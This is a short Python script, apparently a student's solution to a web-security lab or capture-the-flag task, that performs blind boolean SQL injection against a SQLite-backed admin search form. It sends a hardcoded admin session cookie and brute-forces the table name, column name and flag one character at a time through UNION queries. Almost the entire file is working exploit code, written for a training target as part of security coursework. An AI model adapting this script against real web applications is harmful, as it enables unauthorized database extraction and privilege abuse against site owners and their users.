'''
Erik Piersante 60/73/65265 
This code works as an exploit for task 4 with the database as of 02/14,
after database structure changes it may not work
'''
import requests


cookies = {'session': 'eyJhZG1pbiI6InRydWUifQ.Y-Uveg.9rMG2iyh5Wc_ZmksOewYOVGX4nQ'}
url = 'http://websec.srdnlen.it:7074/admin'


#Find the table name
print("Table name...")
table_name = ""
while True:
    old_table_name=table_name

    for c in range(32,127):
        c = chr(c)

        query = "' UNION select NULL FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' AND substr(tbl_name,1,{number}) = '{name}' --".format(number=len(table_name)+1,name=table_name+c)
        data = {'search': query}

        r = requests.post(url=url, cookies=cookies,data=data)

        if('User exists' in r.text):
            table_name = table_name+c
            print(table_name)
            break
            
    if table_name==old_table_name:
        print("The table name is: ", table_name)
        break


#Find the column name
print("Column name...")
column_name = ""
while True:
    old_column_name= column_name
    for c in range(32,127):
        c = chr(c)

        query = "' UNION select NULL FROM PRAGMA_TABLE_INFO('{table_name}') WHERE substr(name,1,{number}) = '{name}' --".format(table_name=table_name,number=len(column_name)+1,name=column_name+c)
        data = {'search': query}

        r = requests.post(url=url, cookies=cookies,data=data)

        if('User exists' in r.text):
            column_name = column_name+c
            print(column_name)
            break
    
    print(column_name, old_column_name)
    if column_name==old_column_name:
        print("The column name is: ", column_name)
        break

#Find the flag
print("Flag...")
flag=""
while True:
    old_flag= flag
    for c in range(32,127):
        c = chr(c)

        query = "' UNION select NULL FROM {table_name} WHERE substr({column_name},1,{number}) = '{name}' --".format(table_name=table_name, column_name=column_name,number=len(flag)+1,name=flag+c)
        data = {'search': query}

        r = requests.post(url=url, cookies=cookies,data=data)

        if('User exists' in r.text):
            flag = flag+c
            print(flag)
            break

    if flag==old_flag:
        break

print("The flag is: ", flag)